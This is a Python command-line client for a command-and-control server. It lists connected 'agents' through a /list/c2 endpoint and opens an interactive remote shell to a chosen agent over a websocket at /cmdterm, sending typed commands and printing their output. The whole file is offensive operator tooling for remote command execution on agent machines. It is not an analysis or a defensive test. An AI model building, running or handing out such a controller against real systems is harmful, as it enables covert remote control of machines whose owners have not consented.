from opcode import hasname
import websockets,requests,asyncio,sys,getopt

from websockets.protocol import State

HOST = ''
AGENT_UID = ''
OUTFILE = ''
LIST_AGENT = False

HELP_MSG = '''

-l,--list-agent\tIt Will list all Connect Agents
-H <hostname<:port>>\tSites HostName e.g. localhost:8080 , localhost
-u,--UID\tUID Of the Agent
-o,--output\tSave The Shell output in a file
-h\tPrint This message

'''


def PrintAgents(hostname):
    try:
        req = requests.get(f'http://{hostname}/list/c2',verify=False)
        if(req.ok):
            for key,value in req.json().items():
                print(f'{key} -> {value}')
            #print(req.json())
    except Exception as Err:
        print(str(Err))



async def ReadIncoming(client):
    try:
        while True:
            data = await client.recv()
            print(data.decode(),end='')
    except websockets.ConnectionClosed as Err:
        print(str(Err))
    except asyncio.CancelledError as Err:
        print(str(Err))
        return


async def SpawnShell(hostname,uid):
    bg_task : asyncio.Task = None
    
    try:
        ws = await websockets.connect(f'ws://{hostname}/cmdterm?uid={uid}')
        if ws.state ==State.OPEN:
            bg_task = asyncio.create_task(ReadIncoming(ws))
            print("Connected...")
            while True:
                cmd = await asyncio.to_thread(input,'')
                if cmd == 'SelfExit':
                    if bg_task:
                        bg_task.cancel('User Exit')
                        await bg_task
                    await ws.close()
                    break
                if cmd != '':
                    await ws.send(cmd)
        else:
            print("failed To Connect")
    except websockets.ConnectionClosed as Err:
        print(str(Err))
    finally:
        if bg_task:
            bg_task.cancel('User Exit')
            await bg_task


if(len(sys.argv) < 2):
    print(f'{sys.argv[0]} -h for help')
    exit(0)



try:

    opts , _ = getopt.getopt(sys.argv[1:],"o:lH:u:h",['host=','list-agent','UID=','output='])
    for opt,arg in opts:
        if opt in ['-H','--host']:
            HOST = arg
        elif opt in ['-l','--list-agent'] and AGENT_UID == '':
            LIST_AGENT = True
        elif opt in ['-u','--UID'] and LIST_AGENT == False:
            AGENT_UID = arg
        elif opt in ['-o','--output']:
            OUTFILE = arg
        elif opt == '-h':
            print(HELP_MSG)
            exit(0)

    #print(AGENT_UID,HOST,OUTFILE,LIST_AGENT)

    if LIST_AGENT and HOST != '':
       PrintAgents(HOST)
    if AGENT_UID!='' and HOST != '':
        asyncio.run(SpawnShell(HOST,AGENT_UID))

except Exception as Err:
    print(str(Err))